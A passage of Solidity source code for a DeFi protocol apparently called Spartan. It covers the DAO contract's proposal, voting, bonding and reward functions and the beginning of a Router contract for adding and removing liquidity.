}\n\n    //==================================== PROTOCOL CONTRACTs SETTER =================================//\n\n    function setGenesisAddresses(address _router, address _utils, address _reserve) external onlyDAO {\n        _ROUTER = iROUTER(_router);\n        _UTILS = iUTILS(_utils);\n        _RESERVE = iRESERVE(_reserve);\n    }\n\n    function setVaultAddresses(address _daovault, address _bondvault, address _synthVault) external onlyDAO {\n        _DAOVAULT = iDAOVAULT(_daovault);\n        _BONDVAULT = iBONDVAULT(_bondvault);\n        _SYNTHVAULT = iSYNTHVAULT(_synthVault); \n    }\n    \n    function setFactoryAddresses(address _poolFactory, address _synthFactory) external onlyDAO {\n        _POOLFACTORY = iPOOLFACTORY(_poolFactory);\n        _SYNTHFACTORY = iSYNTHFACTORY(_synthFactory);\n    }\n\n    function setGenesisFactors(uint32 _coolOff, uint32 _daysToEarn, uint32 _majorityFactor, uint32 _daoClaim, uint32 _daoFee) external onlyDAO {\n        coolOffPeriod = _coolOff;\n        erasToEarn = _daysToEarn;\n        majorityFactor = _majorityFactor;\n        daoClaim = _daoClaim;\n        daoFee = _daoFee;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() external onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Can change vesting period for bonders\n    function changeBondingPeriod(uint256 bondingSeconds) external onlyDAO{\n        bondingPeriodSeconds = bondingSeconds;\n    }\n\n    //============================== USER - DEPOSIT/WITHDRAW ================================//\n\n    // User deposits LP tokens in the DAOVault\n    function deposit(address pool, uint256 amount) external {\n        depositLPForMember(pool, amount, msg.sender);\n    }\n\n    // Contract deposits LP tokens for member\n    function depositLPForMember(address pool, uint256 amount, address member) public {\n        require(_POOLFACTORY.isCuratedPool(pool) == true, \"!curated\"); // Pool must be Curated\n        require(amount > 0, \"!amount\"); // Deposit amount must be valid\n        if (isMember[member] != true) {\n            arrayMembers.push(member); // If not a member; add user to member array\n            isMember[member] = true; // If not a member; register the user as member\n        }\n        if((_DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), \"!funds\"); // Send user's deposit to the DAOVault\n        _DAOVAULT.depositLP(pool, amount, member); // Update user's deposit balance & weight\n        mapMember_lastTime[member] = block.timestamp; // Reset user's last harvest time\n        emit MemberDeposits(member, pool, amount);\n    }\n    \n    // User withdraws all of their selected asset from the DAOVault\n    function withdraw(address pool) external {\n        removeVote(); // Users weight is removed from the current open DAO proposal\n        require(_DAOVAULT.withdraw(pool, msg.sender), \"!transfer\"); // User receives their withdrawal\n    }\n\n    //============================== REWARDS ================================//\n    \n    // User claims their DAOVault incentives\n    function harvest() public {\n        require(_RESERVE.emissions(), \"!emissions\"); // Reserve must have emissions turned on\n        uint reward = calcCurrentReward(msg.sender); // Calculate the user's claimable incentive\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)); // Get total BASE balance of RESERVE\n        uint daoReward = (reserve * daoClaim) / 10000; // Get DAO's share of BASE balance of RESERVE (max user claim amount)\n        if(reward > daoReward){\n            reward = daoReward; // User cannot claim more than the daoReward limit\n        }\n        _RESERVE.grantFunds(reward, msg.sender); // Send the claim to the user\n    }\n\n    // Calculate the user's current incentive-claim per era\n    function calcCurrentReward(address member) public view returns(uint){\n        uint secondsSinceClaim = block.timestamp - mapMember_lastTime[member]; // Get seconds passed since last claim\n        uint share = calcReward(member); // Get share of rewards for user\n        uint reward = (share * secondsSinceClaim) / secondsPerEra; // User's share times eras since they last claimed\n        return reward;\n    }\n\n    // Calculate the user's current total claimable incentive\n    function calcReward(address member) public view returns(uint){\n        uint weight = _DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member); // Get combined total weights (scope: user)\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total weights (scope: vaults)\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)) / erasToEarn; // Aim to deplete reserve over a number of days\n        uint daoReward = (reserve * daoClaim) / 10000; // Get the DAO's share of that\n        return _UTILS.calcShare(weight, _totalWeight, daoReward); // Get users's share of that (1 era worth)\n    }\n\n    //================================ BOND Feature ==================================//\n\n    // Can burn the SPARTA remaining in this contract (Bond allocations held in the DAO)\n    function burnBalance() external onlyDAO returns (bool){\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBASE(BASE).burn(baseBal);   \n        return true;\n    }\n\n    // Can transfer the SPARTA remaining in this contract to a new DAO (If DAO is upgraded)\n    function moveBASEBalance(address newDAO) external onlyDAO {\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBEP20(BASE).transfer(newDAO, baseBal);\n    }\n\n    // List an asset to be enabled for Bonding\n    function listBondAsset(address asset) external onlyDAO {\n        if(!isListed[asset]){\n            isListed[asset] = true; // Register as a currently enabled asset\n            listedBondAssets.push(asset); // Add to historical record of past Bond assets\n        }\n        emit ListedAsset(msg.sender, asset);\n    }\n\n    // Delist an asset from the Bond program\n    function delistBondAsset(address asset) external onlyDAO {\n        isListed[asset] = false; // Unregister as a currently enabled asset\n        emit DelistedAsset(msg.sender, asset);\n    }\n\n    // User deposits assets to be Bonded\n    function bond(address asset, uint256 amount) external payable returns (bool success) {\n        require(amount > 0, '!amount'); // Amount must be valid\n        require(isListed[asset], '!listed'); // Asset must be listed for Bond\n        if (isMember[msg.sender] != true) {\n            arrayMembers.push(msg.sender); // If user is not a member; add them to the member array\n            isMember[msg.sender] = true; // Register user as a member\n        }\n        if((_DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        uint256 liquidityUnits = handleTransferIn(asset, amount); // Add liquidity and calculate LP units\n        _BONDVAULT.depositForMember(asset, msg.sender, liquidityUnits); // Deposit the Bonded LP units in the BondVault\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        emit DepositAsset(msg.sender, amount, liquidityUnits);\n        return true;\n    }\n\n    // Add Bonded assets as liquidity and calculate LP units\n    function handleTransferIn(address _token, uint _amount) internal returns (uint LPunits){\n        uint256 spartaAllocation = _UTILS.calcSwapValueInBase(_token, _amount); // Get the SPARTA swap value of the bonded assets\n        if(iBEP20(BASE).allowance(address(this), address(_ROUTER)) < spartaAllocation){\n            iBEP20(BASE).approve(address(_ROUTER), iBEP20(BASE).totalSupply()); // Increase SPARTA allowance if required\n        }\n        if(_token == address(0)){\n            require((_amount == msg.value), \"!amount\");\n            LPunits = _ROUTER.addLiquidityForMember{value:_amount}(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & BNB as liquidity to mint LP tokens\n        } else {\n            iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract\n            if(iBEP20(_token).allowance(address(this), address(_ROUTER)) < _amount){\n                uint256 approvalTNK = iBEP20(_token).totalSupply();\n                iBEP20(_token).approve(address(_ROUTER), approvalTNK); // Increase allowance if required\n            }\n            LPunits = _ROUTER.addLiquidityForMember(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & assets as liquidity to mint LP tokens\n        } \n    }\n\n    // User claims all of their unlocked Bonded LPs\n    function claimAllForMember(address member) external returns (bool){\n        address [] memory listedAssets = listedBondAssets; // Get array of bond assets\n        for(uint i = 0; i < listedAssets.length; i++){\n            uint claimA = calcClaimBondedLP(member, listedAssets[i]); // Check user's unlocked Bonded LPs for each asset\n            if(claimA > 0){\n               _BONDVAULT.claimForMember(listedAssets[i], member); // Claim LPs if any unlocked\n            }\n        }\n        return true;\n    }\n\n    // User claims unlocked Bond units of a selected asset\n    function claimForMember(address asset) external returns (bool){\n        uint claimA = calcClaimBondedLP(msg.sender, asset); // Check user's unlocked Bonded LPs\n        if(claimA > 0){\n            _BONDVAULT.claimForMember(asset, msg.sender); // Claim LPs if any unlocked\n        }\n        return true;\n    }\n    \n    // Calculate user's unlocked Bond units of a selected asset\n    function calcClaimBondedLP(address bondedMember, address asset) public returns (uint){\n        uint claimAmount = _BONDVAULT.calcBondedLP(bondedMember, asset); // Check user's unlocked Bonded LPs\n        return claimAmount;\n    }\n\n    //============================== CREATE PROPOSALS ================================//\n\n    // New ID, but specify type, one type for each function call\n    // Votes counted to IDs\n    // IDs are finalised\n    // IDs are executed, but type specifies unique logic\n\n    // New DAO proposal: Simple action\n    function newActionProposal(string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: uint parameter\n    function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_param[currentProposal] = param; // Set the proposed parameter\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Address parameter\n    function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_address[currentProposal] = proposedAddress; // Set the proposed new address\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Grant SPARTA to wallet\n    function newGrantProposal(address recipient, uint amount) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        string memory typeStr = \"GRANT\";\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        mapPID_address[currentProposal] = recipient; // Set the proposed grant recipient\n        mapPID_param[currentProposal] = amount; // Set the proposed grant amount\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // If no existing open DAO proposal; register a new one\n    function checkProposal() internal {\n        require(mapPID_open[currentProposal] == false, '!open'); // There must not be an existing open proposal\n        proposalCount += 1; // Increase proposal count\n        currentProposal = proposalCount; // Set current proposal to the new count\n        mapPID_open[currentProposal] = true; // Set new proposal as open status\n        mapPID_startTime[currentProposal] = block.timestamp; // Set the start time of the proposal to now\n    }\n    \n    // Pay the fee for a new DAO proposal\n    function payFee() internal returns(bool){\n        uint _amount = daoFee*(10**18); // Convert DAO fee to WEI\n        require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee\n        return true;\n    } \n\n    //============================== VOTE && FINALISE ================================//\n\n    // Vote for a proposal\n    function voteProposal() external returns (uint voteWeight) {\n        require(mapPID_open[currentProposal] == true, \"!open\"); // Proposal must be open status\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeight = countVotes(); // Vote for proposal and recount\n        if(hasQuorum(currentProposal) && mapPID_finalising[currentProposal] == false){\n            if(isEqual(_type, 'DAO') || isEqual(_type, 'UTILS') || isEqual(_type, 'RESERVE') ||isEqual(_type, 'GET_SPARTA') || isEqual(_type, 'ROUTER') || isEqual(_type, 'LIST_BOND')|| isEqual(_type, 'GRANT')|| isEqual(_type, 'ADD_CURATED_POOL')){\n                if(hasMajority(currentProposal)){\n                    _finalise(); // Critical proposals require 'majority' consensus to enter finalization phase\n                }\n            } else {\n                _finalise(); // Other proposals require 'quorum' consensus to enter finalization phase\n            }\n        }\n        emit NewVote(msg.sender, currentProposal, voteWeight, mapPID_votes[currentProposal], string(_type));\n    }\n\n    // Remove vote from a proposal\n    function removeVote() public returns (uint voteWeightRemoved){\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeightRemoved = mapPIDMember_votes[currentProposal][msg.sender]; // Get user's current vote weight\n        if(mapPID_open[currentProposal]){\n            mapPID_votes[currentProposal] -= voteWeightRemoved; // Remove user's votes from propsal (scope: proposal)\n        }\n        mapPIDMember_votes[currentProposal][msg.sender] = 0; // Remove user's votes from propsal (scope: member)\n        emit RemovedVote(msg.sender, currentProposal, voteWeightRemoved, mapPID_votes[currentProposal], string(_type));\n        return voteWeightRemoved;\n    }\n\n    // Push the proposal into 'finalising' status\n    function _finalise() internal {\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        mapPID_finalising[currentProposal] = true; // Set finalising status to true\n        mapPID_coolOffTime[currentProposal] = block.timestamp; // Set timestamp to calc cooloff time from\n        emit ProposalFinalising(msg.sender, currentProposal, block.timestamp+coolOffPeriod, string(_type));\n    }\n\n    // Attempt to cancel the open proposal\n    function cancelProposal() external {\n        require(block.timestamp > (mapPID_startTime[currentProposal] + 1296000), \"!days\"); // Proposal must not be new\n        mapPID_votes[currentProposal] = 0; // Clear all votes from the proposal\n        mapPID_open[currentProposal] = false; // Set the proposal as not open (closed status)\n        emit CancelProposal(msg.sender, currentProposal);\n    }\n\n    // A finalising-stage proposal can be finalised after the cool off period\n    function finaliseProposal() external {\n        require((block.timestamp - mapPID_coolOffTime[currentProposal]) > coolOffPeriod, \"!cooloff\"); // Must be past cooloff period\n        require(mapPID_finalising[currentProposal] == true, \"!finalising\"); // Must be in finalising stage\n        if(!hasQuorum(currentProposal)){\n            mapPID_finalising[currentProposal] = false; // If proposal has lost quorum consensus; kick it out of the finalising stage\n        } else {\n            bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n            if(isEqual(_type, 'DAO')){\n                moveDao(currentProposal);\n            } else if (isEqual(_type, 'ROUTER')) {\n                moveRouter(currentProposal);\n            } else if (isEqual(_type, 'UTILS')){\n                moveUtils(currentProposal);\n            } else if (isEqual(_type, 'RESERVE')){\n                moveReserve(currentProposal);\n            } else if (isEqual(_type, 'FLIP_EMISSIONS')){\n                flipEmissions(currentProposal);\n            } else if (isEqual(_type, 'COOL_OFF')){\n                changeCooloff(currentProposal);\n            } else if (isEqual(_type, 'ERAS_TO_EARN')){\n                changeEras(currentProposal);\n            } else if (isEqual(_type, 'GRANT')){\n                grantFunds(currentProposal);\n            } else if (isEqual(_type, 'GET_SPARTA')){\n                _increaseSpartaAllocation(currentProposal);\n            } else if (isEqual(_type, 'LIST_BOND')){\n                _listBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'DELIST_BOND')){\n                _delistBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'ADD_CURATED_POOL')){\n                _addCuratedPool(currentProposal);\n            } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){\n                _removeCuratedPool(currentProposal);\n            } \n        }\n    }\n\n    // Change the DAO to a new contract address\n    function moveDao(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        DAO = _proposedAddress; // Change the DAO to point to the new DAO address\n        iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address\n        daoHasMoved = true; // Set status of this old DAO\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the ROUTER to a new contract address\n    function moveRouter(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _ROUTER = iROUTER(_proposedAddress); // Change the DAO to point to the new ROUTER address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the UTILS to a new contract address\n    function moveUtils(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _UTILS = iUTILS(_proposedAddress); // Change the DAO to point to the new UTILS address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the RESERVE to a new contract address\n    function moveReserve(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _RESERVE = iRESERVE(_proposedAddress); // Change the DAO to point to the new RESERVE address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Flip the BASE emissions on/off\n    function flipEmissions(uint _proposalID) internal {\n        iBASE(BASE).flipEmissions(); // Toggle emissions on the BASE contract\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change cool off period (Period of time until a finalising proposal can be finalised)\n    function changeCooloff(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        coolOffPeriod = _proposedParam; // Change coolOffPeriod\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change erasToEarn (Used to regulate the incentives flow)\n    function changeEras(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        erasToEarn = _proposedParam; // Change erasToEarn\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Grant SPARTA to the proposed recipient\n    function grantFunds(uint _proposalID) internal {\n        uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient\n        require(_proposedAmount != 0, \"!param\"); // Proposed grant amount must be valid\n        require(_proposedAddress != address(0), \"!address\"); // Proposed recipient must be valid\n        _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Mint a 2.5M SPARTA allocation for the Bond program\n    function _increaseSpartaAllocation(uint _proposalID) internal {\n        uint256 _2point5m = 2.5*10**6*10**18; //_2.5m\n        iBASE(BASE).mintFromDAO(_2point5m, address(this)); // Mint SPARTA and send to DAO to hold\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // List an asset to be enabled for Bonding\n    function _listBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        if(!isListed[_proposedAddress]){\n            isListed[_proposedAddress] = true; // Register asset as listed for Bond\n            listedBondAssets.push(_proposedAddress); // Add asset to array of listed Bond assets\n        }\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Delist an asset from being allowed to Bond\n    function _delistBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        isListed[_proposedAddress] = false; // Unregister asset as listed for Bond (Keep it in the array though; as this is used in the UI)\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Add a pool as 'Curated' to enable synths, weight and incentives\n    function _addCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        _POOLFACTORY.addCuratedPool(_proposedAddress); // Add the pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Remove a pool from Curated status\n    function _removeCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed asset for removal\n        _POOLFACTORY.removeCuratedPool(_proposedAddress); // Remove pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n    \n    // After completing the proposal's action; close it\n    function completeProposal(uint _proposalID) internal {\n        string memory _typeStr = mapPID_type[_proposalID]; // Get proposal type\n        emit FinalisedProposal(msg.sender, _proposalID, mapPID_votes[_proposalID], _DAOVAULT.totalWeight(), _typeStr);\n        mapPID_votes[_proposalID] = 0; // Reset proposal votes to 0\n        mapPID_finalised[_proposalID] = true; // Finalise the proposal\n        mapPID_finalising[_proposalID] = false; // Remove proposal from 'finalising' stage\n        mapPID_open[_proposalID] = false; // Close the proposal\n    }\n\n    //============================== CONSENSUS ================================//\n    \n    // Add user's total weight to proposal and recount\n    function countVotes() internal returns (uint voteWeight){\n        mapPID_votes[currentProposal] -= mapPIDMember_votes[currentProposal][msg.sender]; // Remove user's current votes from the open proposal\n        voteWeight = _DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender); // Get user's combined total weights\n        mapPID_votes[currentProposal] += voteWeight; // Add user's total weight to the current open proposal (scope: proposal)\n        mapPIDMember_votes[currentProposal][msg.sender] = voteWeight; // Add user's total weight to the current open proposal (scope: member)\n        return voteWeight;\n    }\n\n    // Check if a proposal has Majority consensus\n    function hasMajority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight * majorityFactor / 10000; // Majority > 66.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Quorum consensus\n    function hasQuorum(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 2; // Quorum > 50%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Minority consensus\n    function hasMinority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 6; // Minority > 16.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    //======================================PROTOCOL CONTRACTs GETTER=================================//\n    \n    // Get the ROUTER address that the DAO currently points to\n    function ROUTER() public view returns(iROUTER){\n        if(daoHasMoved){\n            return Dao(DAO).ROUTER();\n        } else {\n            return _ROUTER;\n        }\n    }\n\n    // Get the UTILS address that the DAO currently points to\n    function UTILS() public view returns(iUTILS){\n        if(daoHasMoved){\n            return Dao(DAO).UTILS();\n        } else {\n            return _UTILS;\n        }\n    }\n\n    // Get the BONDVAULT address that the DAO currently points to\n    function BONDVAULT() public view returns(iBONDVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).BONDVAULT();\n        } else {\n            return _BONDVAULT;\n        }\n    }\n\n    // Get the DAOVAULT address that the DAO currently points to\n    function DAOVAULT() public view returns(iDAOVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).DAOVAULT();\n        } else {\n            return _DAOVAULT;\n        }\n    }\n\n    // Get the POOLFACTORY address that the DAO currently points to\n    function POOLFACTORY() public view returns(iPOOLFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).POOLFACTORY();\n        } else {\n            return _POOLFACTORY;\n        }\n    }\n\n    // Get the SYNTHFACTORY address that the DAO currently points to\n    function SYNTHFACTORY() public view returns(iSYNTHFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHFACTORY();\n        } else {\n            return _SYNTHFACTORY;\n        }\n    }\n\n    // Get the RESERVE address that the DAO currently points to\n    function RESERVE() public view returns(iRESERVE){\n        if(daoHasMoved){\n            return Dao(DAO).RESERVE();\n        } else {\n            return _RESERVE;\n        }\n    }\n\n    // Get the SYNTHVAULT address that the DAO currently points to\n    function SYNTHVAULT() public view returns(iSYNTHVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHVAULT();\n        } else {\n            return _SYNTHVAULT;\n        }\n    }\n\n    //============================== HELPERS ================================//\n    \n    function memberCount() external view returns(uint){\n        return arrayMembers.length;\n    }\n\n    function getProposalDetails(uint proposalID) external view returns (ProposalDetails memory proposalDetails){\n        proposalDetails.id = proposalID;\n        proposalDetails.proposalType = mapPID_type[proposalID];\n        proposalDetails.votes = mapPID_votes[proposalID];\n        proposalDetails.coolOffTime = mapPID_coolOffTime[proposalID];\n        proposalDetails.finalising = mapPID_finalising[proposalID];\n        proposalDetails.finalised = mapPID_finalised[proposalID];\n        proposalDetails.param = mapPID_param[proposalID];\n        proposalDetails.proposedAddress = mapPID_address[proposalID];\n        proposalDetails.open = mapPID_open[proposalID];\n        proposalDetails.startTime = mapPID_startTime[proposalID];\n        return proposalDetails;\n    }\n\n    function assetListedCount() external view returns (uint256 count){\n        return listedBondAssets.length;\n    }\n\n    function allListedAssets() external view returns (address[] memory _allListedAssets){\n        return listedBondAssets;\n    }\n    \n    function isEqual(bytes memory part1, bytes memory part2) private pure returns(bool){\n        if(sha256(part1) == sha256(part2)){\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n\n   \n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./Pool.sol\";\nimport \"./interfaces/iRESERVE.sol\"; \nimport \"./interfaces/iPOOLFACTORY.sol\";  \nimport \"./interfaces/iWBNB.sol\";\n\ncontract Router {\n    address public BASE;\n    address public WBNB;\n    address public DEPLOYER;\n\n    uint private maxTrades;         // Amount of dividend events per era\n    uint private eraLength;         // Dividend factor to regulate the max percentage of RESERVE balance\n    uint public normalAverageFee;   // The average fee size (dividend smoothing)\n    uint private arrayFeeSize;      // The size of the average window used for normalAverageFee\n    uint [] private feeArray;       // The array used to calc normalAverageFee\n    uint private lastMonth;         // Timestamp of the start of current metric period (For UI)\n\n    mapping(address=> uint) public mapAddress_30DayDividends;\n    mapping(address=> uint) public mapAddress_Past30DayPoolDividends;\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == _DAO().DAO() || msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor (address _base, address _wbnb) {\n        BASE = _base;\n        WBNB = _wbnb;\n        arrayFeeSize = 20;\n        eraLength = 30;\n        maxTrades = 100;\n        lastMonth = 0;\n        DEPLOYER = msg.sender;\n    }\n\n    receive() external payable {}\n\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    // User adds liquidity\n    function addLiquidity(uint inputBase, uint inputToken, address token) external payable{\n        addLiquidityForMember(inputBase, inputToken, token, msg.sender);\n    }\n\n    // Contract adds liquidity for user\n    function addLiquidityForMember(uint inputBase, uint inputToken, address token, address member) public payable{\n        address pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token);  // Get pool address\n        _handleTransferIn(BASE, inputBase, pool); // Transfer SPARTA to pool\n        _handleTransferIn(token, inputToken, pool); // Transfer TOKEN to pool\n        Pool(pool).addForMember(member); // Add liquidity to pool for user\n    }\n\n    // Trade LP tokens for another type of LP tokens\n    function zapLiquidity(uint unitsInput, address fromPool, address toPool) external {\n        require(iPOOLFACTORY(_DAO().POOLFACTORY()).isPool(fromPool) == true); // FromPool must be a valid pool\n        require(iPOOLFACTORY(_DAO().POOLFACTORY()).isPool(toPool) == true); // ToPool must be a valid pool\n        address _fromToken = Pool(fromPool).TOKEN(); // Get token underlying the fromPool\n        address _member = msg.sender; // Get user's address\n        require(unitsInput <= iBEP20(fromPool).totalSupply()); // Input must be valid\n        iBEP20(fromPool).transferFrom(_member, fromPool, unitsInput); // Transfer LPs from user to the pool\n        Pool(fromPool).remove(); // Remove liquidity to ROUTER\n        iBEP20(_fromToken).transfer(fromPool, iBEP20(_fromToken).balanceOf(address(this))); // Transfer TOKENs from ROUTER to fromPool\n        Pool(fromPool).swapTo(BASE, toPool); // Swap the received TOKENs for SPARTA then transfer to the toPool\n        iBEP20(BASE).transfer(toPool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to toPool\n        Pool(toPool).addForMember(_member); // Add liquidity and send the LPs to user\n    }\n\n    // User adds liquidity asymetrically (one asset)\n    function addLiquiditySingle(uint inputToken, bool fromBase, address token) external payable{\n        addLiquiditySingleForMember(inputToken, fromBase, token, msg.sender);\n    }\n\n    // Contract adds liquidity asymetrically for user (one asset)\n    function addLiquiditySingleForMember(uint inputToken, bool fromBase, address token, address member) public payable{\n        require(inputToken > 0); // Must be valid input amount\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address\n        address _token = token;\n        if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB\n        if(fromBase){\n            _handleTransferIn(BASE, inputToken, _pool); // Transfer SPARTA into pool\n            Pool(_pool).addForMember(member); // Add liquidity and send LPs to user\n        } else {\n            _handleTransferIn(token, inputToken, _pool); // Transfer TOKEN into pool\n            Pool(_pool).addForMember(member); // Add liquidity and send LPs to user\n        }\n    }\n\n    // User removes liquidity - redeems a percentage of their balance\n    function removeLiquidity(uint basisPoints, address token) external{\n        require((basisPoints > 0 && basisPoints <= 10000)); // Must be valid basis points\n        uint _units = iUTILS(_DAO().UTILS()).calcPart(basisPoints, iBEP20(iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token)).balanceOf(msg.sender));\n        removeLiquidityExact(_units, token);\n    }\n\n    // User removes liquidity - redeems exact qty of LP tokens\n    function removeLiquidityExact(uint units, address token) public {\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get the pool address\n        address _member = msg.sender; // The the user's address\n        iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to the pool\n        if(token != address(0)){\n            Pool(_pool).removeForMember(_member); // Remove liquidity and send assets directly to user\n        } else {\n            Pool(_pool).remove(); // If BNB; remove liquidity and send to ROUTER instead\n            uint outputBase = iBEP20(BASE).balanceOf(address(this)); // Get the received SPARTA amount\n            uint outputToken = iBEP20(WBNB).balanceOf(address(this)); // Get the received WBNB amount\n            _handleTransferOut(token, outputToken, _member); // Unwrap to BNB & tsf it to user\n            